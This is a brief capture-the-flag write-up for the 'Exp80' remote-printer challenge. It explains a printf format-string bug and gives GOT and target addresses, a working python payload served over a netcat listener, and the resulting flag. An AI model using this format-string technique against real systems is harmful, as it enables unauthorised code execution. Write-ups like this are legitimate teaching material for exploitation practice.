# Exp80

## Description
```
We are given an IP address and a port to connect to and a binary file which is the binary run by the service
```

## Disclaimer
This is a very quick write-up and assume basic knowledge of the technique used in the exploitation. I also won't detail how the reversing was done


## Solution

The file is an ELF 32-bit LSB executable. Upon reversing and playing with it we see that it asks to enter an IP address, then a port, opens a socket to the pair provided and print the data it received. 

The vulnerability lies in the call to printf following the recv call. Since the input is passed as an argument to printf as it is, it is vulnerable to a format string attack. Plenty of tutorials are available on google for those not familiar.

Upon reversing we also encounter a function never called which opens a "flag.txt" file, reads its content and print it.

The exploitation seems very straightforward from there, we will overwrite a GOT entry with the address of the code mentionned above. In the code handling the socket, following the printf call there is a call to the close method. I decided to overwrite this entry in the GOT.

Address of the GOT to overwrite: 0x08049c80

Address of the code to overwrite the GOT: 0x8048867

On the attacking machine

```
python -c 'print "\x80\x9c\x04\x08"+"%34915p"+"%7$hn"' | nc -lvp <your_port>
```

On the targeted machine:

```
This is a remote printer!
Enter IPv4 address:<your_IP>
Enter port:<your_port>
```

## Results
```
YAY, FLAG: IW{YVO_F0RmaTt3d_RMT_Pr1nT3R}
```